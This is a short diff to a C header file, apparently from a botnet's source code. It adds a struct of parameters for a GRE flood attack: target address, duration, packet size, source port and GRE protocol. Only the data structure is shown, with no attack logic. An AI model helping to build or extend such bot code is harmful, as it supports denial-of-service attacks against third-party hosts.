+++ bot/headers/attack_params.h
@@ -11,4 +11,13 @@ typedef struct {
     int srcport;
 } attack_params;
 
+typedef struct {
+    struct sockaddr_in target_addr;
+    int duration;
+    int active;
+    int psize;
+    int srcport;
+    int gre_proto;
+} gre_attack_params;
+
 #endif // ATTACK_PARAMS_H